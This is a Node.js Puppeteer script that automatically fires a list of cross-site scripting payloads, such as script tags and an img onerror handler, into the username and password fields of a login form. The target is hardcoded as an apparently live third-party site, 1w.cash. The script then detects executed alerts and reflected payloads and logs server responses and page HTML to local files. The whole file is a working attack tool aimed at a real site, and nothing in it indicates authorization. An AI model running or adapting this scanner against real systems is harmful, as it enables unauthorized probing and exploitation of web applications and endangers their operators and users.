const puppeteer = require('puppeteer');
const fs = require('fs'); // Node built-in file system module to save logs locally

const payloads = [
    '"><script>alert(1)</script>',
    '" onerror="alert(1)',
    '</script><script>alert(1)</script>',
    '<img src=x onerror=alert(1)>'
];

const targetUrl = 'https://1w.cash'; 

const FORM_FIELDS = [
    { name: 'Username Field', selector: 'input[name="username"]', safeValue: 'valid_test_user' },
    { name: 'Password Field', selector: 'input[name="password"]', safeValue: 'ValidPassword123!' }
];

const SUBMIT_SELECTOR = 'button[type="submit"]';

async function scanAndLogFields() {
    console.log(`[+] Initializing Chromium Browser with Response Monitors...`);
    const browser = await puppeteer.launch({ headless: true });

    for (let targetField of FORM_FIELDS) {
        console.log(`\n==================================================`);
        console.log(`[🚀 AUDITING FIELD]: ${targetField.name}`);
        console.log(`==================================================`);

        for (let payload of payloads) {
            const page = await browser.newPage();
            let lastServerResponseText = "";

            // --- MONITOR 1: INTERCEPTING BACKEND SERVER RESPONSES ---
            page.on('response', async (response) => {
                const url = response.url();
                // Filter out external image assets, fonts, or tracking scripts to stay focused
                if (url.includes('api') || url === targetUrl || response.status() >= 400) {
                    try {
                        const contentType = response.headers()['content-type'] || '';
                        if (contentType.includes('json') || contentType.includes('text/html')) {
                            lastServerResponseText = await response.text();
                        }
                    } catch (err) {
                        // Suppress reading errors from aborted or stream-locked network sockets
                    }
                }
            });

            // Listen for successful XSS dialog trigger execution flags
            page.on('dialog', async dialog => {
                if (dialog.type() === 'alert') {
                    console.log(`\n[🚨 XSS EXECUTED SUCCESSFULLY!] Field: ${targetField.name}`);
                    console.log(`[🎯 Payload]: ${payload}`);
                    await dialog.dismiss();
                }
            });

            try {
                await page.goto(targetUrl, { waitUntil: 'networkidle2' });

                // Fill form fields sequentially
                for (let currentField of FORM_FIELDS) {
                    await page.waitForSelector(currentField.selector, { timeout: 4000 });
                    await page.click(currentField.selector);
                    
                    await page.keyboard.down('Control');
                    await page.keyboard.press('A');
                    await page.keyboard.up('Control');
                    await page.keyboard.press('Backspace');

                    if (currentField.name === targetField.name) {
                        console.log(`[*] Injecting payload into ${currentField.name}: ${payload}`);
                        await page.type(currentField.selector, payload);
                    } else {
                        await page.type(currentField.selector, currentField.safeValue);
                    }
                }

                // Submit and handle state transitions
                await page.waitForSelector(SUBMIT_SELECTOR, { timeout: 4000 });
                console.log(`[*] Submitting...`);
                
                await Promise.all([
                    page.click(SUBMIT_SELECTOR),
                    page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 5000 }).catch(() => {})
                ]);

                // --- MONITOR 2: DUMPING POST-SUBMISSION DOM STATE ---
                // Evaluate the current state of the page tree to see if the payload was written anywhere
                const visibleHtmlTree = await page.evaluate(() => document.body.innerHTML);

                // Check if the payload was blocked or just neutralised in raw HTML text
                if (visibleHtmlTree.includes(payload)) {
                    console.log(`[⚠️ REFLECTION DETECTED]: Payload text was rendered into the HTML layout.`);
                }

                // Save individual transaction traces into a local text log for analysis
                const logFileName = `log_${targetField.name.replace(/\s+/g, '_')}_${Date.now()}.txt`;
                const fullLogContent = 
`=========================================
FIELD TEST DETAILS
=========================================
Target Field: ${targetField.name}
Payload String: ${payload}
Current URL Path: ${page.url()}

=========================================
[STREAM 1] LAST DETECTED SERVER RESPONSE TEXT
=========================================
${lastServerResponseText}

=========================================
[STREAM 2] SUBMITTED HTML DOM BODY (TRUNCATED TO FIRST 1000 CHARACTERS)
=========================================
${visibleHtmlTree.substring(0, 1000)}...
\n`;

                fs.writeFileSync(logFileName, fullLogContent);
                console.log(`[+] Verification data written out to: ${logFileName}`);

            } catch (error) {
                console.log(`[-] Process timed out or altered during request cycle.`);
            } finally {
                await page.close();
            }
        }
    }

    console.log(`\n[+] Inspection Campaign Finished.`);
    await browser.close();
}

scanAndLogFields();
